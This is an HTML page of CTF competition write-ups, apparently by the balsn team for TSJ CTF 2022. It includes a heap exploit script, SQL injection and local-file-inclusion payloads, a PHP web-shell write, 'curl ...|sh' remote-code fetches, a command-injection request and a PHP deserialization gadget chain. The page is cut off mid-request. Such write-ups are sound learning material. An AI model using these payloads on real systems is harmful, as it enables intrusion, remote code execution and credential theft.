@@ -1,0 +1,710 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>TSJ CTF 2022</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#babynote">babynote</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#futago">futago</a>
+    
+                <a class="dropdown-item" href="#babyrsa">babyrsa</a>
+    
+                <a class="dropdown-item" href="#top-secret">top-secret</a>
+    
+                <a class="dropdown-item" href="#cipher-switching-service">cipher-switching-service</a>
+    
+                <a class="dropdown-item" href="#rng">rng</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pentest
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#nentau-police-office---1">nentau-police-office---1</a>
+    
+                <a class="dropdown-item" href="#nentau-police-office---2">nentau-police-office---2</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#nimja-at-nantou">nimja-at-nantou</a>
+    
+                <a class="dropdown-item" href="#avatar">avatar</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#javascript_vm">javascript_vm</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#babynote" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babynote</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#futago" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">futago</span>
+            </a>
+    
+<a href="#babyrsa" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyrsa</span>
+            </a>
+    
+<a href="#top-secret" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">top-secret</span>
+            </a>
+    
+<a href="#cipher-switching-service" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cipher-switching-service</span>
+            </a>
+    
+<a href="#rng" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rng</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pentest</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#nentau-police-office---1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">nentau-police-office---1</span>
+            </a>
+    
+<a href="#nentau-police-office---2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">nentau-police-office---2</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#nimja-at-nantou" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">nimja-at-nantou</span>
+            </a>
+    
+<a href="#avatar" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">avatar</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#javascript_vm" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">javascript_vm</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="tsj-ctf-2022"><a class="header-link" href="#tsj-ctf-2022"></a>TSJ CTF 2022</h1>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>pwn</h2>
+<h3 id="babynote"><a class="header-link" href="#babynote"></a>BabyNote</h3>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python2</span>
+
+<span class="hljs-attribute">from</span> pwn import *
+
+
+<span class="hljs-attribute">r</span> = remote(&#x27;<span class="hljs-number">34.81.158.137</span>&#x27;, <span class="hljs-number">10102</span>)
+
+<span class="hljs-attribute">def</span> create_note(n, l, c):
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;&gt;&#x27;)
+  <span class="hljs-attribute">r</span>.sendline(<span class="hljs-string">&quot;1&quot;</span>)
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;Your Name:&#x27;)
+  <span class="hljs-attribute">r</span>.send(n)
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;Note length:&#x27;)
+  <span class="hljs-attribute">r</span>.sendline(str(l))
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;Note:&#x27;)
+  <span class="hljs-attribute">r</span>.send(c)
+
+<span class="hljs-attribute">def</span> edit_note(i, n, c):
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;&gt;&#x27;)
+  <span class="hljs-attribute">r</span>.sendline(<span class="hljs-string">&quot;3&quot;</span>)
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;ID:&#x27;)
+  <span class="hljs-attribute">r</span>.sendline(str(i))
+  <span class="hljs-attribute">print</span> r.recvuntil(&#x27;Name:&#x27;)
+  <span class="hljs-attribute">r</span>.send(n)
+  <span class="hljs-attribute">print</span> r.recvuntil(&#x27;:&#x27;)
+  <span class="hljs-attribute">r</span>.send(c)
+
+<span class="hljs-attribute">def</span> delete_note(i):
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;&gt;&#x27;)
+  <span class="hljs-attribute">r</span>.sendline(<span class="hljs-string">&quot;4&quot;</span>)
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;ID:&#x27;)
+  <span class="hljs-attribute">r</span>.sendline(str(i))
+
+<span class="hljs-attribute">def</span> list_note():
+  <span class="hljs-attribute">r</span>.recvuntil(&#x27;&gt;&#x27;)
+  <span class="hljs-attribute">r</span>.sendline(<span class="hljs-string">&quot;2&quot;</span>)
+
+<span class="hljs-attribute">create_note</span>(<span class="hljs-string">&quot;n1&quot;</span>, <span class="hljs-number">1152</span>, &#x27;a&#x27;)
+<span class="hljs-attribute">create_note</span>(<span class="hljs-string">&quot;n2&quot;</span>, <span class="hljs-number">1152</span>, &#x27;a&#x27;)
+<span class="hljs-attribute">delete_note</span>(<span class="hljs-number">0</span>)
+<span class="hljs-attribute">create_note</span>(<span class="hljs-string">&quot;n3&quot;</span>, <span class="hljs-number">1152</span>, &#x27;a&#x27;)
+<span class="hljs-attribute">list_note</span>()
+<span class="hljs-attribute">r</span>.recvuntil(&#x27;a&#x27;)
+<span class="hljs-attribute">a</span> = r.recvline()
+<span class="hljs-attribute">base</span> = u<span class="hljs-number">64</span>(&#x27;a&#x27; + a[:-<span class="hljs-number">1</span>] + &#x27;\<span class="hljs-number">0</span>\<span class="hljs-number">0</span>&#x27; )
+
+<span class="hljs-attribute">print</span> hex(base)
+<span class="hljs-attribute">print</span> a, repr(a)
+<span class="hljs-attribute">create_note</span>(<span class="hljs-string">&quot;o1&quot;</span>, <span class="hljs-number">32</span>, &#x27;o<span class="hljs-number">1</span>&#x27;)
+<span class="hljs-attribute">create_note</span>(<span class="hljs-string">&quot;o2&quot;</span>, <span class="hljs-number">32</span>, &#x27;o<span class="hljs-number">2</span>&#x27;)
+
+<span class="hljs-attribute">p1</span> = &#x27;<span class="hljs-number">6161616161616161616161616161616161616161616161616161616161616161616161616161616131000000000000006</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">6</span>e<span class="hljs-number">2000000000000000</span>&#x27;.decode(&#x27;hex&#x27;)
+<span class="hljs-comment"># 614bcc44cb7f</span>
+<span class="hljs-comment"># 287bcc44cb7f</span>
+<span class="hljs-comment"># a005b644cb7f</span>
+<span class="hljs-attribute">j</span> = &#x27;<span class="hljs-number">287</span>bcc<span class="hljs-number">44</span>cb<span class="hljs-number">7</span>f<span class="hljs-number">0000</span>&#x27;
+
+<span class="hljs-attribute">p1</span> += p<span class="hljs-number">64</span>(base + <span class="hljs-number">12231</span>)
+<span class="hljs-attribute">edit_note</span>(<span class="hljs-number">2</span>, &#x27;aaaaaaaaaaaaaaaa\xff&#x27;, p<span class="hljs-number">1</span>)
+<span class="hljs-attribute">edit_note</span>(<span class="hljs-number">3</span>, &#x27;o<span class="hljs-number">2</span>&#x27;, p<span class="hljs-number">64</span>(base - <span class="hljs-number">1459649</span>  -<span class="hljs-number">205200</span>))
+<span class="hljs-attribute">create_note</span>(<span class="hljs-string">&quot;ls&quot;</span>, <span class="hljs-number">64</span>, &#x27;bash&#x27;)
+<span class="hljs-attribute">list_note</span>()
+<span class="hljs-attribute">delete_note</span>(<span class="hljs-number">4</span>)
+<span class="hljs-attribute">r</span>.interactive()</code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>crypto</h2>
+<h3 id="futago"><a class="header-link" href="#futago"></a>Futago</h3>
+<ul class="list">
+<li>level 1: Two $N$s have a non trivial common divisor, which trivialized the factorization</li>
+<li>level 2: Two $N$s are the same, but the $e$s are different. Since two $e$s have gcd 3, we can get $m^3$ by extended Euclidean algorithm. Luckily, $m^3 &lt; N$, allowing us to recover $m$ by taking a cubic root.</li>
+<li>level 3: Assume $N_1 = pq$ and $N_2 = (p+a)(q+b)$. Bruteforce $a$ and $b$ and solve a quadratic equation to factorize both $N$s.</li>
+</ul>
+<h3 id="babyrsa"><a class="header-link" href="#babyrsa"></a>BabyRSA</h3>
+<p>In this challenge, we are given a point on elliptic curve
+$$E:y^2 = x^3 + px + q \pmod N$$
+where $N, p, q$ are parameters of an RSA encrypted flag. By the process of prime generation, $q$ is 512-bit while $p$ is a 1024-bit, and such asymmetry reminds us of coppersmith attack. Specifically, plug in the coordinates of the given elliptic curve point $(x_0, y_0)$, we have
+$$px_0 + q = y_0^2 - x_0^3 \pmod N.$$
+Multiply by $q$ to eliminate the $p$, we get
+$$q^2 = (y_0^2 - x_0^3)q \pmod N.$$
+Thus, we get a quadratic equation of $q$. Since $q &lt;&lt; N^{\frac{1}{2}}$, we can use standard coppersmith method to solve for $q$, and further compromise the RSA.</p>
+<h3 id="top-secret"><a class="header-link" href="#top-secret"></a>Top Secret</h3>
+<p>Observing the output of LFSR, it&#39;s easy to see that if we transform the output to an element in $GF(2^{128})$, then the output keystream $ks_1, ks_2, \dots$ satisfies
+$$ks_i = ks_{i-1} \cdot x^{k}$$
+where $k$ is the secret key. The challenge provides $ks_0$, and $ks_1$ is leaked by the observation that a png file has a fixed 16-byte header. Therefore, we can get $ks_2$ by calculating
+$$\frac{ks_1^2}{ks_0}$$
+without knowing the value of $k$. Similarly, we can recover all output blocks of the keystream, and recover the plaintext.</p>
+<h3 id="cipher-switching-service"><a class="header-link" href="#cipher-switching-service"></a>Cipher Switching Service</h3>
+<p>The key observation is that given an Elgamal encryption $(c_1, c_2)$ of a message $m$, we can forge an Elgamal encryption of message $2m$ – it is just simply $(c_1, 2c_2)$. When we switching these two ciphertext back to RSA encryption we get
+$$(c_1, c_2) \to x, \quad (c_1, 2c_2) \to x&#39;$$
+One might assumes that $x&#39; = 2^ex$. However, there&#39;s an exception when $2m \ge p$, where we get $x&#39; = (2m-p)^e \pmod N$ instead of $(2m)^e$. Therefore, we get a MSB-ish oracle, and we can do a binary search to decrypt a Elgamal encrypted message. Out attack goes as follow:</p>
+<ul class="list">
+<li>Using RSA-to-Elgamal, get an Elgamal encryption of the flag.</li>
+<li>Perform the binary search and recover the flag.</li>
+</ul>
+<h3 id="rng"><a class="header-link" href="#rng"></a>Rng++</h3>
+<p>Observations:</p>
+<ul class="list">
+<li>All characters of the random string is digits, meaning that it all starts with a &#39;3&#39; in hex.</li>
+<li>$M$ is a power of 2.</li>
+</ul>
+<p>We can recover the lowest bytes by setting $M = 256$ and bruteforce all possible states to find the one that matches (the fact that the random string is all digits). and then recover the second lowest bytes and so on. At the end, we recover the states of the RNG, and can predict its output, allowing us to recover the flag.</p>
+<h2 id="pentest"><a class="header-link" href="#pentest"></a>pentest</h2>
+<h3 id="nentau-police-office---1"><a class="header-link" href="#nentau-police-office---1"></a>Nentau Police Office - 1</h3>
+<ol class="list">
+<li>SQL Injection<ul class="list">
+<li>dump schema: <code>/news.php?id=-1%20union%20select%201,2,group_concat(schema_name),4,5%20from%20information_schema.schemata</code></li>
+<li>dump user: <code>/news.php?id=-1%20union%20select%201,2,group_concat(concat(uid,0x20,username,0x20,password)),4,5%20from%20users</code><ul class="list">
+<li><code>1 tsjadmin RRwZriRCF3CoYtbjkF3u</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>LFI<ul class="list">
+<li><code>/adminmanager.php?op=././././users</code></li>
+<li>using <a href="https://github.com/w181496/Web-CTF-Cheatsheet#pear">pearcmd.php</a> to RCE<ul class="list">
+<li><code>/adminmanager.php?+config-create+/&amp;op=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=system($_GET[1]);?&gt;+/var/tmp/a.php</code></li>
+<li><code>/adminmanager.php?op=../../../../../../../../var/tmp/a&amp;1=curl%20kaibro.tw|sh</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>flag permission<ul class="list">
+<li><code>flag1.txt</code> owner is <code>tsjadmin</code><pre class="prettyprint">www-data@nentaupoliceoffice:/$ cat flag1.txt
+cat flag1.txt
+cat: flag1.txt: Permission denied
+</pre>
+</li>
+</ul>
+</li>
+<li>find <code>tsjadmin</code>&#39;s password<ul class="list">
+<li><code>cat /var/www/html/config.php</code><pre class="prettyprint">...
+$host = &quot;database&quot;;
+$dbname = &quot;announcement&quot;;
+$user = &quot;tsjadmin&quot;;
+$pass = &quot;tsjadmin@nentaupoliceoffice&quot;;
+$db = new PDO(&quot;mysql:host=$host;dbname=$dbname&quot;, $user, $pass);
+session_start();
+...
+</pre>
+</li>
+</ul>
+</li>
+<li><code>su tsjadmin</code> with password: <code>tsjadmin@nentaupoliceoffice</code></li>
+<li><code>cat /flag1.txt</code><ul class="list">
+<li><code>TSJ{Just_an_simple_Penetration_Testing_challenge}</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="nentau-police-office---2"><a class="header-link" href="#nentau-police-office---2"></a>Nentau Police Office - 2</h3>
+<ul class="list">
+<li><code>flag2.txt</code> permission<ul class="list">
+<li><code>-r-------- 1 root root 33 Feb 18 07:56 flag2.txt</code></li>
+</ul>
+</li>
+<li>sudoer file<ul class="list">
+<li><code>/etc/sudoers.d/sudoers-tsj</code><pre class="prettyprint">tsjadmin workstation=(ALL:ALL)  /bin/cat
+tsjadmin nentaupoliceoffice=(ALL:ALL)  /bin/ls
+</pre>
+</li>
+</ul>
+</li>
+<li>use sudo <code>-h</code> option to bypass host limit<ul class="list">
+<li><code>sudo -h workstation /bin/cat /flag*</code><ul class="list">
+<li><code>TSJ{What_use_of_the_-h_option???}</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="web"><a class="header-link" href="#web"></a>web</h2>
+<h3 id="nimja-at-nantou"><a class="header-link" href="#nimja-at-nantou"></a>Nimja at Nantou</h3>
+<p>Use <code>#</code> to bypass the appended <code>hello</code></p>
+<pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/hello-from-the-world/get_hello?host=http://localhost/%23</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0</code></pre><p>Then get the key <code>T$J_CTF_15_FUN_&gt;_&lt;_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag</code></p>
+<p>Use double slash to bypass proxy&#39;s limit, and use <code>{&quot;service&quot;:[&quot;xxx&quot;]}</code> to bypass <code>sanitizeShellString</code>.</p>
+<pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/service-info//admin</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxx
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>114
+
+<span class="json">{<span class="hljs-attr">&quot;service&quot;</span>:[<span class="hljs-string">&quot;|`curl kaibro.tw/yy|sh`|&quot;</span>],<span class="hljs-attr">&quot;key&quot;</span>: <span class="hljs-string">&quot;T$J_CTF_15_FUN_&gt;_&lt;_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag&quot;</span>}</span></code></pre><p><code>TSJ{HR5_1S_C001_XD_L3ts_gooooo}</code></p>
+<h3 id="avatar"><a class="header-link" href="#avatar"></a>Avatar</h3>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+  <span class="hljs-keyword">namespace</span> <span class="hljs-title">Envms</span>\<span class="hljs-title">FluentPDO</span>{
+    <span class="hljs-title">class</span> <span class="hljs-title">Structure</span>{
+      <span class="hljs-title">public</span> $<span class="hljs-title">primaryKey</span>;
+      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
+        <span class="hljs-keyword">$this</span>-&gt;primaryKey = <span class="hljs-string">&#x27;system&#x27;</span>;
+      }
+    }
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span>{
+      <span class="hljs-keyword">public</span> <span class="hljs-variable">$pdo</span>;
+      <span class="hljs-keyword">public</span> <span class="hljs-variable">$structure</span>;
+      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$struct</span></span>)</span>{
+        <span class="hljs-keyword">$this</span>-&gt;pdo = <span class="hljs-literal">null</span>;
+        <span class="hljs-keyword">$this</span>-&gt;structure = <span class="hljs-variable">$struct</span>;
+      }
+    }
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Regex</span></span>{
+    }
+  }
+
+  <span class="hljs-keyword">namespace</span> <span class="hljs-title">Envms</span>\<span class="hljs-title">FluentPDO</span>\<span class="hljs-title">Queries</span>{
+    <span class="hljs-title">class</span> <span class="hljs-title">Select</span>{
+      <span class="hljs-title">public</span> $<span class="hljs-title">fluent</span>;
+      <span class="hljs-keyword">public</span> <span class="hljs-variable">$clauses</span>;
+      <span class="hljs-keyword">public</span> <span class="hljs-variable">$statements</span>;
+      <span class="hljs-keyword">public</span> <span class="hljs-variable">$regex</span>;
+      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$query</span>, <span class="hljs-variable">$clauses</span>, <span class="hljs-variable">$statements</span>, <span class="hljs-variable">$regex</span></span>)</span>{
+        <span class="hljs-keyword">$this</span>-&gt;fluent = <span class="hljs-variable">$query</span>;
+        <span class="hljs-keyword">$this</span>-&gt;clauses = <span class="hljs-variable">$clauses</span>;
+        <span class="hljs-keyword">$this</span>-&gt;statements = <span class="hljs-variable">$statements</span>;
+        <span class="hljs-keyword">$this</span>-&gt;regex = <span class="hljs-variable">$regex</span>;
+      }
+
+    }
+  }
+
+  <span class="hljs-keyword">namespace</span> {
+    $<span class="hljs-title">regex</span> = <span class="hljs-title">new</span> <span class="hljs-title">Envms</span>\<span class="hljs-title">FluentPDO</span>\<span class="hljs-title">Regex</span>();
+    <span class="hljs-variable">$struct</span> = <span class="hljs-keyword">new</span> Envms\FluentPDO\Structure();
+    <span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> Envms\FluentPDO\Query(<span class="hljs-variable">$struct</span>);
+
+    <span class="hljs-variable">$c_clauses</span> = [];
+    <span class="hljs-variable">$c_statements</span> = [<span class="hljs-string">&#x27;SELECT&#x27;</span>=&gt;[<span class="hljs-string">&#x27;x:x&#x27;</span>], <span class="hljs-string">&#x27;FROM&#x27;</span>=&gt;<span class="hljs-string">&#x27;curl 3419192343|sh&#x27;</span>];
+    <span class="hljs-variable">$common</span>= <span class="hljs-keyword">new</span> Envms\FluentPDO\Queries\Select(<span class="hljs-variable">$query</span>, <span class="hljs-variable">$c_clauses</span>, <span class="hljs-variable">$c_statements</span>, <span class="hljs-variable">$regex</span>);
+
+    <span class="hljs-variable">$n_clauses</span> = [<span class="hljs-string">&#x27;x&#x27;</span> =&gt; [<span class="hljs-variable">$common</span>, <span class="hljs-string">&#x27;getQuery&#x27;</span>]];
+    <span class="hljs-variable">$n_statements</span> = [<span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-literal">True</span>];
+    <span class="hljs-variable">$name</span>= <span class="hljs-keyword">new</span> Envms\FluentPDO\Queries\Select(<span class="hljs-literal">null</span>, <span class="hljs-variable">$n_clauses</span>, <span class="hljs-variable">$n_statements</span>, <span class="hljs-literal">null</span>);
+
+    <span class="hljs-variable">$name</span>= unserialize(serialize(<span class="hljs-variable">$name</span>));
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;url=http://ginoah.tw:8080/a.b%250d%250aSET%2520PHPREDIS_SESSION:7ae84e5c2a2be644c1fdf1b1eeb7d0df%2520%2527username|&#x27;</span>.urlencode(urlencode(serialize(<span class="hljs-variable">$name</span>))).<span class="hljs-string">&quot;%2527%250d%250aHost:%2520xx\n&quot;</span>;
+    <span class="hljs-keyword">die</span>();
+  }
+
+<span class="hljs-meta">?&gt;</span></code></pre><pre class="hljs"><code><span class="hljs-keyword">POST</span> <span class="hljs-string">/update.php?mode=url</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>34.81.158.137:5566
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>1386
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
+<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=7ae84e5c2a2be644c1fdf1b1eeb7d0df
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+
